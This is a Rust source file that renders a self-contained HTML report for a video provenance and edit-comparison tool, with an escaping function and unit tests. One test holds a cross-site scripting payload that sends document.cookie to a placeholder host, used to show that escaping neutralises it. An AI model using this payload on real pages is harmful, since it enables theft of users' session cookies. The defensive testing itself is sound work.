//! The standalone HTML rendering of a report.
//!
//! One file, no external resource of any kind — no stylesheet, no font, no
//! script, no image. It opens from `file://`, survives being mailed as an
//! attachment, and will still render in ten years in a browser nobody has
//! written yet. That is the same property the evidence bundle has, for the
//! same reason: a verification artefact that depends on a server outliving it
//! is not a verification artefact.
//!
//! Everything interpolated goes through `esc`. The inputs include a QR payload
//! read out of a stranger's video, which is to say attacker-controlled text
//! arriving in a document a journalist will open.

use crate::align::Correspondence;
use crate::bundle::Transmission;
use crate::qr::QrFindings;
use crate::report::{Milestone, Report, Section};

/// Escape for HTML text and double-quoted attribute contexts alike.
fn esc(s: &str) -> String {
    let mut out = String::with_capacity(s.len() + 16);
    for c in s.chars() {
        match c {
            '&' => out.push_str("&amp;"),
            '<' => out.push_str("&lt;"),
            '>' => out.push_str("&gt;"),
            '"' => out.push_str("&quot;"),
            '\'' => out.push_str("&#39;"),
            _ => out.push(c),
        }
    }
    out
}

const STYLE: &str = r#"
:root { color-scheme: light dark; --fg:#1a1a1a; --bg:#fbfbfa; --muted:#5a5a5a;
        --rule:#d8d6d0; --panel:#f2f1ed; --accent:#2a4d69; }
@media (prefers-color-scheme: dark) {
  :root { --fg:#e8e6e1; --bg:#161615; --muted:#a3a09a; --rule:#3a3936;
          --panel:#201f1d; --accent:#9dbcd4; }
}
* { box-sizing: border-box; }
body { margin:0; padding:0; background:var(--bg); color:var(--fg);
       font:16px/1.55 -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif; }
.wrap { max-width: 46rem; margin:0 auto; padding:2.5rem 1rem 5rem; }
h1 { font-size:1.5rem; line-height:1.25; margin:0 0 .25rem; letter-spacing:-.01em; }
h2 { font-size:1.05rem; margin:2.75rem 0 .6rem; padding-bottom:.35rem;
     border-bottom:1px solid var(--rule); letter-spacing:.02em; text-transform:uppercase;
     color:var(--muted); font-weight:600; }
h2 .n { color:var(--accent); margin-right:.5rem; }
.sub { color:var(--muted); margin:0 0 2rem; font-size:.9rem; }
.headline { font-size:1.05rem; line-height:1.5; margin:.5rem 0 1rem; }
dl { display:grid; grid-template-columns:max-content 1fr; gap:.3rem 1.1rem; margin:1rem 0; }
dt { color:var(--muted); font-size:.85rem; }
dd { margin:0; font-variant-numeric:tabular-nums; overflow-wrap:anywhere; }
pre { background:var(--panel); border:1px solid var(--rule); border-radius:4px;
      padding:.85rem 1rem; overflow-x:auto; font-size:.8rem; line-height:1.45;
      font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace; }
code { font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace; font-size:.88em; }
table { border-collapse:collapse; width:100%; margin:1rem 0; font-size:.88rem; }
th,td { text-align:left; padding:.45rem .6rem; border-bottom:1px solid var(--rule);
        vertical-align:top; }
th { color:var(--muted); font-weight:600; font-size:.78rem; text-transform:uppercase;
     letter-spacing:.03em; }
td.num { font-variant-numeric:tabular-nums; white-space:nowrap; }
.state { display:inline-block; padding:.15rem .5rem; border-radius:3px; font-size:.78rem;
         font-weight:600; border:1px solid var(--rule); background:var(--panel); }
.note { color:var(--muted); font-size:.88rem; }
.limits li { margin-bottom:.7rem; }
.notperf { background:var(--panel); border:1px solid var(--rule); border-left:3px solid var(--accent);
           border-radius:3px; padding:.8rem 1rem; color:var(--muted); font-size:.92rem; }
footer { margin-top:3.5rem; padding-top:1rem; border-top:1px solid var(--rule);
         color:var(--muted); font-size:.8rem; }
.strip { display:flex; width:100%; height:2.4rem; margin:1.2rem 0 .4rem; border:1px solid var(--rule);
         border-radius:3px; overflow:hidden; background:var(--panel); }
.strip > div { display:flex; align-items:center; justify-content:center; font-size:.72rem;
               font-weight:600; overflow:hidden; min-width:0; }
.seg { background:var(--accent); color:var(--bg); }
.gap { background:repeating-linear-gradient(45deg, transparent, transparent 4px,
       var(--rule) 4px, var(--rule) 8px); }
.legend { font-size:.78rem; color:var(--muted); margin:.2rem 0 1rem; }
.key { display:inline-block; width:1.1rem; height:.7rem; vertical-align:-1px;
       border:1px solid var(--rule); border-radius:2px; }
@media print { body { background:#fff; color:#000; } .wrap { max-width:none; } }
"#;

/// Render the whole report as one self-contained HTML document.
pub fn render(r: &Report) -> String {
    let mut h = String::with_capacity(16 * 1024);
    h.push_str("<!doctype html>\n<html lang=\"en\"><head><meta charset=\"utf-8\">\n");
    h.push_str("<meta name=\"viewport\" content=\"width=device-width,initial-scale=1\">\n");
    h.push_str(&format!(
        "<title>Edit report — {}</title>\n",
        esc(&r.original.label)
    ));
    h.push_str("<style>");
    h.push_str(STYLE);
    h.push_str("</style></head><body><div class=\"wrap\">\n");

    h.push_str(&format!(
        "<h1>Edit report — {}</h1>\n",
        esc(&r.original.label)
    ));
    h.push_str(&format!(
        "<p class=\"sub\">Generated {} by {} {} · frames decoded by {}<br>\
         This is a description of what was measured. It contains no score and reaches no \
         conclusion about the truth of what the picture shows.</p>\n",
        esc(&r.generated_at),
        esc(&r.tool.name),
        esc(&r.tool.version),
        esc(&r.tool.decoder)
    ));

    section_crypto(&mut h, r);
    section_qr(&mut h, r);
    section_correspondence(&mut h, r);
    section_cuts(&mut h, r);
    section_stub(&mut h, "5", "Image differences", &r.image_differences);
    section_limits(&mut h, r);

    h.push_str(&format!(
        "<footer>Milestone: {}. This document is self-contained: it loads no external \
         resource and works offline.</footer>\n",
        esc(milestone_name(r.milestone))
    ));
    h.push_str("</div></body></html>\n");
    h
}

fn milestone_name(m: Milestone) -> &'static str {
    match m {
        Milestone::OriginalOnly => "original only — no comparison performed",
        Milestone::Correspondence => "correspondence and cuts",
        Milestone::ImageDifference => "correspondence, cuts and image differences",
    }
}

fn section_crypto(h: &mut String, r: &Report) {
    h.push_str("<h2><span class=\"n\">1</span>Cryptographic state of the original</h2>\n");
    h.push_str(&format!(
        "<p class=\"headline\">{}</p>\n",
        esc(&r.original.crypto.headline())
    ));

    h.push_str("<dl>");
    h.push_str(&format!(
        "<dt>Recording</dt><dd>{}</dd>",
        esc(&r.original.label)
    ));
    h.push_str(&format!(
        "<dt>Session</dt><dd><code>{}</code></dd>",
        esc(&r.original.session_id)
    ));
    h.push_str(&format!(
        "<dt>Sealed segments</dt><dd>{}</dd>",
        r.original.chunk_count
    ));
    h.push_str(&format!(
        "<dt>Payload</dt><dd>{}</dd>",
        esc(&transmission_words(
            r.original.transmission,
            &r.original.encryption
        ))
    ));
    if let (Some(a), Some(b)) = (r.original.capture_start_us, r.original.capture_end_us) {
        h.push_str(&format!(
            "<dt>Capture window</dt><dd>{} → {} <span class=\"note\">(declared by the device, \
             covered by its signature)</span></dd>",
            esc(&iso_utc(a)),
            esc(&iso_utc(b))
        ));
    }
    for m in &r.original.media {
        h.push_str(&format!(
            "<dt>{}</dt><dd class=\"num\">{}×{}, {} frames, {}{}</dd>",
            esc(m.stream_id.as_deref().unwrap_or("video")),
            m.width,
            m.height,
            m.frame_count,
            esc(&duration_words(m.duration_us)),
            m.nominal_fps
                .map(|f| format!(", {f:.3} fps"))
                .unwrap_or_default(),
        ));
    }
    h.push_str("</dl>\n");

    if let Some(v) = &r.original.crypto.verifier {
        if let Some(sha) = &v.sha256 {
            // The version is named alongside the digest because the digest
            // alone is not actionable: a reader who wants to check that this
            // verifier is the published one has to know which release to
            // compare against, and an older bundle legitimately carries an
            // older verifier. The published location is written as text, not
            // as a link -- every report in this tool loads nothing, and a
            // rendered document that fetched something would break the
            // no-network promise after the fact.
            let ver = v
                .version
                .as_deref()
                .map(|x| format!(" version <code>{}</code>,", esc(x)))
                .unwrap_or_default();
            h.push_str(&format!(
                "<p class=\"note\">Checked by the verifier shipped inside this bundle, \
                 <code>verify_bundle.py</code>,{} SHA-256 <code>{}</code>. This tool contains no \
                 second implementation of those checks. That verifier arrived inside the archive \
                 it vouches for, so if this bundle matters, compare that digest against the \
                 published releases at github.com/Forsheur/verify-bundle, or against the copy a \
                 Forsheur server publishes at <code>/verifier.sha256</code>. A digest matching an \
                 older release is the ordinary case; one matching no published release is not.</p>\n",
                ver,
                esc(sha)
            ));
        }
    }

    if let Some(t) = &r.original.crypto.transcript {
        h.push_str(
            "<p class=\"note\">The verifier's own output, reproduced without \
                    alteration:</p>\n",
        );
        h.push_str(&format!("<pre>{}</pre>\n", esc(t)));
    }
}

/// One line for the report describing how this recording travelled.
///
/// The three readings are not interchangeable, and the difference that matters
/// to a reader is what it says about the ARCHIVE they are holding, not about
/// the journey. Transport sealing is a fact about the phone — the recording was
/// never at rest in cleartext on it — and says nothing about whether this
/// bundle can be read. Presenting it as a lock, which an earlier version of
/// this tool did, tells a journalist their evidence is unreadable when it is
/// sitting right there.
fn transmission_words(t: Transmission, scheme: &str) -> String {
    match t {
        Transmission::Clear => {
            "clear — the sealed bytes are the media as captured, and were sent as such".to_string()
        }
        Transmission::Transport => {
            "transport-sealed — the phone sealed each payload to the platform's key, so the \
             recording was never at rest in cleartext on the device; the server opened it on \
             arrival, and the bytes in this bundle are the media"
                .to_string()
        }
        Transmission::E2e => format!(
            "end-to-end encrypted ({scheme}) — the bytes in this bundle are ciphertext and no \
             key exists here. Provenance is proven without revealing content"
        ),
    }
}

/// Two or three words for a terminal line.
pub fn transmission_short(t: Transmission) -> &'static str {
    match t {
        Transmission::Clear => "clear",
        Transmission::Transport => "transport-sealed",
        Transmission::E2e => "end-to-end encrypted",
    }
}

fn section_qr(h: &mut String, r: &Report) {
    h.push_str("<h2><span class=\"n\">2</span>Codes burned into the picture</h2>\n");
    h.push_str(
        "<p class=\"note\">A Forsheur recording burns <code>&lt;host&gt;/v/&lt;short id&gt;</code> \
         into every frame. Those are pixels, not signatures: they say what a video <em>claims</em> \
         to be. Their absence says nothing at all — the band sits at the top of the frame, which \
         is the first thing a crop removes and the usual place for a subtitle bar.</p>\n",
    );
    qr_table(h, "In the original", &r.qr.original);
    if let Some(c) = &r.qr.copy {
        qr_table(h, "In the video under comparison", c);
    }
    if !r.qr.observations.is_empty() {
        h.push_str("<ul>");
        for o in &r.qr.observations {
            h.push_str(&format!("<li>{}</li>", esc(o)));
        }
        h.push_str("</ul>\n");
    }
}

fn qr_table(h: &mut String, title: &str, f: &QrFindings) {
    h.push_str(&format!("<h3 class=\"note\">{}</h3>\n", esc(title)));
    if f.is_empty() {
        h.push_str(&format!(
            "<p class=\"notperf\">No code was read, over {} frame(s) examined. This is a \
             statement about what this run could read, not about the video.</p>\n",
            f.frames_examined
        ));
        return;
    }
    h.push_str(&format!(
        "<p class=\"note\">{} of {} frames examined carried a code.</p>\n",
        f.frames_with_code, f.frames_examined
    ));
    h.push_str(
        "<table><thead><tr><th>Payload</th><th>Reads</th><th>Recording</th>\
                <th>Span (frames)</th></tr></thead><tbody>",
    );
    for c in &f.codes {
        let recording = match &c.reference {
            Some(rf) => format!("{} on {}", esc(&rf.short_id), esc(&rf.host)),
            None => "<span class=\"note\">not a Forsheur reference</span>".to_string(),
        };
        h.push_str(&format!(
            "<tr><td><code>{}</code></td><td class=\"num\">{}</td><td>{}</td>\
             <td class=\"num\">{}–{}</td></tr>",
            esc(&c.payload),
            c.frames,
            recording,
            c.first_frame,
            c.last_frame
        ));
    }
    h.push_str("</tbody></table>\n");
}

/// §6.3 — the correspondence table, drawn as a strip of the copy's timeline.
///
/// A picture first, because the shape of an edit is what a reader takes in
/// before any number: three blocks with gaps between them IS a montage of
/// three segments, and a table of microsecond boundaries is not. The table
/// follows for anyone who needs the values.
///
/// Drawn with nothing but sized divs. No image, no script, no font — the
/// report has to open from `file://` in ten years.
fn section_correspondence(h: &mut String, r: &Report) {
    h.push_str("<h2><span class=\"n\">3</span>Correspondence</h2>\n");
    let corr = match &r.correspondence {
        Section::NotPerformed(reason) => {
            h.push_str(&format!(
                "<p class=\"notperf\">Not performed — {}.</p>\n",
                esc(reason)
            ));
            return;
        }
        Section::Performed(c) => c,
    };

    if corr.nothing_established() {
        if let Some(caveat) = corr.original_self_similarity.caveat() {
            h.push_str(&format!("<p class=\"notperf\">{}</p>\n", esc(&caveat)));
        }
        h.push_str(&format!(
            "<p class=\"headline\">No correspondence was established between the two videos, \
             over {} frame(s) examined in the copy.</p>\n\
             <p class=\"note\">This is what an unrelated recording produces. It is equally what \
             a crop, a very heavy re-encode, a mirrored copy or a speed change produce, and this \
             tool cannot tell those apart. It is not a finding about the copy.</p>\n",
            corr.copy_frames_examined
        ));
        return;
    }

    if let Some(caveat) = corr.original_self_similarity.caveat() {
        h.push_str(&format!("<p class=\"notperf\">{}</p>\n", esc(&caveat)));
    }

    let span = timeline_span(corr);
    h.push_str(&format!(
        "<p class=\"headline\">{} stretch(es) of the copy correspond to stretches of the \
         original, covering {}.</p>\n",
        corr.segments.len(),
        esc(&duration_words(corr.matched_duration_us()))
    ));

    // The strip: the copy's own timeline, left to right.
    h.push_str("<div class=\"strip\" role=\"img\" aria-label=\"copy timeline\">");
    let mut cursor = span.0;
    let width_of = |a: i64, b: i64| -> f32 {
        let total = (span.1 - span.0).max(1) as f32;
        ((b - a).max(0) as f32 / total) * 100.0
    };
    for (i, seg) in corr.segments.iter().enumerate() {
        if seg.copy_start_us > cursor {
            h.push_str(&format!(
                "<div class=\"gap\" style=\"width:{:.4}%\" title=\"no correspondence\"></div>",
                width_of(cursor, seg.copy_start_us)
            ));
        }
        h.push_str(&format!(
            "<div class=\"seg\" style=\"width:{:.4}%\" title=\"from {} of the original\">{}</div>",
            width_of(seg.copy_start_us, seg.copy_end_us),
            esc(&clock(seg.original_start_us)),
            i + 1
        ));
        cursor = cursor.max(seg.copy_end_us);
    }
    if cursor < span.1 {
        h.push_str(&format!(
            "<div class=\"gap\" style=\"width:{:.4}%\" title=\"no correspondence\"></div>",
            width_of(cursor, span.1)
        ));
    }
    h.push_str("</div>\n");
    h.push_str(
        "<p class=\"legend\"><span class=\"key seg\"></span> corresponds to the original \
         &nbsp; <span class=\"key gap\"></span> no correspondence established</p>\n",
    );

    h.push_str(
        "<table><thead><tr><th>#</th><th>In the copy</th><th>In the original</th>\
         <th>Offset</th><th>Frames agreeing</th><th>Mean distance</th></tr></thead><tbody>",
    );
    for (i, s) in corr.segments.iter().enumerate() {
        h.push_str(&format!(
            "<tr><td class=\"num\">{}</td><td class=\"num\">{} → {}</td>\
             <td class=\"num\">{} → {}</td><td class=\"num\">{:+.2} s</td>\
             <td class=\"num\">{}</td><td class=\"num\">{:.1} / 63</td></tr>",
            i + 1,
            esc(&clock(s.copy_start_us)),
            esc(&clock(s.copy_end_us)),
            esc(&clock(s.original_start_us)),
            esc(&clock(s.original_end_us)),
            s.offset_us as f64 / 1e6,
            s.frames_agreeing,
            s.mean_distance,
        ));
    }
    h.push_str("</tbody></table>\n");

    if !corr.unmatched.is_empty() {
        h.push_str("<h3 class=\"note\">Stretches with no correspondence established</h3>\n");
        h.push_str(
            "<table><thead><tr><th>In the copy</th><th>Duration</th>\
             <th>Frames examined</th></tr></thead><tbody>",
        );
        for u in &corr.unmatched {
            h.push_str(&format!(
                "<tr><td class=\"num\">{} → {}</td><td class=\"num\">{}</td>\
                 <td class=\"num\">{}</td></tr>",
                esc(&clock(u.copy_start_us)),
                esc(&clock(u.copy_end_us)),
                esc(&duration_words(u.copy_end_us - u.copy_start_us)),
                u.frames_examined,
            ));
        }
        h.push_str("</tbody></table>\n");
        h.push_str(
            "<p class=\"note\">Reported as absence of a reading. A stretch with no \
             correspondence is not evidence that anything was altered — inserted material, a \
             passage too dark to match, and a section the original never contained all look like \
             this from here.</p>\n",
        );
    }

    h.push_str(&format!(
        "<p class=\"note\">Method: each frame is reduced to a 64-bit perceptual hash (pHash, \
         DCT-based), and pairs within {} bits are proposed. A stretch of copy taken from the \
         original shares one constant time offset, so offsets that many frames agree on are what \
         make a segment. {} of {} examined copy frames were matched; {} carried too little \
         structure to anchor anything and were left out.</p>\n",
        corr.threshold_used,
        corr.copy_frames_matched,
        corr.copy_frames_examined,
        corr.copy_frames_low_variance,
    ));
}

/// §6.4 — cuts, with their timestamps in both videos.
fn section_cuts(h: &mut String, r: &Report) {
    h.push_str("<h2><span class=\"n\">4</span>Cuts</h2>\n");
    let cuts = match &r.cuts {
        Section::NotPerformed(reason) => {
            h.push_str(&format!(
                "<p class=\"notperf\">Not performed — {}.</p>\n",
                esc(reason)
            ));
            return;
        }
        Section::Performed(c) => c,
    };
    h.push_str(
        "<p class=\"note\">A cut is a change of time offset between two consecutive stretches. \
         They are read off the correspondence rather than searched for separately — a second \
         method could disagree with the first, and then neither would be worth having.</p>\n",
    );
    if cuts.is_empty() {
        h.push_str(
            "<p class=\"notperf\">No discontinuity was found in the correspondence. The copy \
             reads as one continuous stretch of the original.</p>\n",
        );
        return;
    }
    h.push_str(&format!(
        "<p class=\"headline\">{} discontinuit{} in the correspondence. A video that was edited \
         has these; their presence is expected and is not itself irregular.</p>\n",
        cuts.len(),
        if cuts.len() == 1 { "y" } else { "ies" }
    ));
    h.push_str(
        "<table><thead><tr><th>In the copy</th><th>Left the original at</th>\
         <th>Resumed at</th><th>Original time skipped</th></tr></thead><tbody>",
    );
    for c in cuts {
        let skipped = c.original_skipped_us();
        h.push_str(&format!(
            "<tr><td class=\"num\">{}</td><td class=\"num\">{}</td><td class=\"num\">{}</td>\
             <td class=\"num\">{}{}</td></tr>",
            esc(&clock(c.copy_at_us)),
            esc(&clock(c.original_left_us)),
            esc(&clock(c.original_resumed_us)),
            esc(&duration_words(skipped.abs())),
            if c.goes_backwards() {
                " earlier — the copy goes back"
            } else {
                ""
            },
        ));
    }
    h.push_str("</tbody></table>\n");
}

/// The copy's timeline bounds, for drawing.
fn timeline_span(c: &Correspondence) -> (i64, i64) {
    let start = c
        .segments
        .iter()
        .map(|s| s.copy_start_us)
        .chain(c.unmatched.iter().map(|u| u.copy_start_us))
        .min()
        .unwrap_or(0);
    let end = c
        .segments
        .iter()
        .map(|s| s.copy_end_us)
        .chain(c.unmatched.iter().map(|u| u.copy_end_us))
        .max()
        .unwrap_or(start + 1);
    (start, end.max(start + 1))
}

/// `m:ss.d` from the start of its own video.
fn clock(us: i64) -> String {
    let neg = us < 0;
    let t = us.abs();
    let (m, s, d) = (t / 60_000_000, (t / 1_000_000) % 60, (t / 100_000) % 10);
    format!("{}{m}:{s:02}.{d}", if neg { "-" } else { "" })
}

fn section_stub<T>(h: &mut String, n: &str, title: &str, s: &Section<T>) {
    h.push_str(&format!(
        "<h2><span class=\"n\">{}</span>{}</h2>\n",
        esc(n),
        esc(title)
    ));
    match s {
        Section::NotPerformed(reason) => {
            h.push_str(&format!(
                "<p class=\"notperf\">Not performed — {}.</p>\n",
                esc(reason)
            ));
        }
        Section::Performed(_) => {
            // Filled by milestones 2 and 3; the renderer for each lands with them.
            h.push_str("<p class=\"notperf\">Rendered by a later milestone.</p>\n");
        }
    }
}

fn section_limits(h: &mut String, r: &Report) {
    h.push_str("<h2><span class=\"n\">6</span>Limits</h2>\n");
    h.push_str(
        "<p class=\"note\">This section is part of every report this tool produces, whatever it \
         found. It does not shrink when the news is good.</p>\n",
    );
    h.push_str("<ul class=\"limits\">");
    for l in &r.limits {
        h.push_str(&format!("<li>{}</li>", esc(l)));
    }
    h.push_str("</ul>\n");
}

/// Microseconds since the Unix epoch → `YYYY-MM-DDTHH:MM:SSZ`.
///
/// Hand-rolled because the core takes no dependency it does not need, and a
/// date library for one format string is a dependency this crate would then
/// carry into wasm. Proleptic Gregorian, no leap seconds — the same calendar
/// the burned-in overlay uses.
pub fn iso_utc(us: i64) -> String {
    let secs = us.div_euclid(1_000_000);
    let (days, rem) = (secs.div_euclid(86_400), secs.rem_euclid(86_400));
    let (h, m, s) = (rem / 3600, (rem % 3600) / 60, rem % 60);
    // Howard Hinnant's civil_from_days.
    let z = days + 719_468;
    let era = z.div_euclid(146_097);
    let doe = z.rem_euclid(146_097);
    let yoe = (doe - doe / 1460 + doe / 36524 - doe / 146_096) / 365;
    let y = yoe + era * 400;
    let doy = doe - (365 * yoe + yoe / 4 - yoe / 100);
    let mp = (5 * doy + 2) / 153;
    let d = doy - (153 * mp + 2) / 5 + 1;
    let mo = if mp < 10 { mp + 3 } else { mp - 9 };
    let y = if mo <= 2 { y + 1 } else { y };
    format!("{y:04}-{mo:02}-{d:02}T{h:02}:{m:02}:{s:02}Z")
}

fn duration_words(us: i64) -> String {
    let total = us / 1_000_000;
    let (m, s) = (total / 60, total % 60);
    if m > 0 {
        format!("{m} min {s:02} s")
    } else {
        format!("{s} s")
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn escapes_every_dangerous_character() {
        assert_eq!(esc("<script>&\"'"), "&lt;script&gt;&amp;&quot;&#39;");
    }

    #[test]
    fn a_hostile_qr_payload_cannot_break_out_of_the_document() {
        // The payload comes out of a stranger's video and lands in a file a
        // journalist opens. It is text, and it stays text.
        let evil = "\"><script>fetch('http://x/'+document.cookie)</script>";
        let out = esc(evil);
        assert!(!out.contains('<'));
        assert!(!out.contains('>'));
        assert!(!out.contains('"'));
    }

    #[test]
    fn iso_utc_matches_known_instants() {
        assert_eq!(iso_utc(0), "1970-01-01T00:00:00Z");
        assert_eq!(iso_utc(1_000_000), "1970-01-01T00:00:01Z");
        // The capture time of the first chunk of the fixture recording.
        assert_eq!(iso_utc(1_788_432_242_208_262), "2026-09-03T10:44:02Z");
        // Leap day.
        assert_eq!(iso_utc(1_709_164_800_000_000), "2024-02-29T00:00:00Z");
    }

    #[test]
    fn duration_reads_as_minutes_and_seconds() {
        assert_eq!(duration_words(85_868_333), "1 min 25 s");
        assert_eq!(duration_words(9_000_000), "9 s");
    }

    #[test]
    fn end_to_end_wording_never_implies_something_is_wrong() {
        let w = transmission_words(Transmission::E2e, "aes-gcm-256");
        assert!(w.to_lowercase().contains("provenance is proven"));
        assert!(!w.to_lowercase().contains("fail"));
    }

    #[test]
    fn transport_sealing_is_not_described_as_a_lock_on_the_archive() {
        // The wording bug that shipped with the classification bug: a reader
        // told their transport-sealed recording is "encrypted" concludes the
        // evidence is unreadable, when the pictures are right there.
        let w = transmission_words(Transmission::Transport, "box-seal-x25519");
        assert!(w.contains("the bytes in this bundle are the media"));
        for banned in ["ciphertext", "no key", "cannot be read", "decrypt"] {
            assert!(
                !w.to_lowercase().contains(banned),
                "transport wording says {banned:?}: {w}"
            );
        }
    }

    #[test]
    fn each_mode_reads_differently_from_the_others() {
        let c = transmission_words(Transmission::Clear, "none");
        let t = transmission_words(Transmission::Transport, "box-seal-x25519");
        let e = transmission_words(Transmission::E2e, "aes-gcm-256");
        assert_ne!(c, t);
        assert_ne!(t, e);
        assert_ne!(c, e);
    }
}
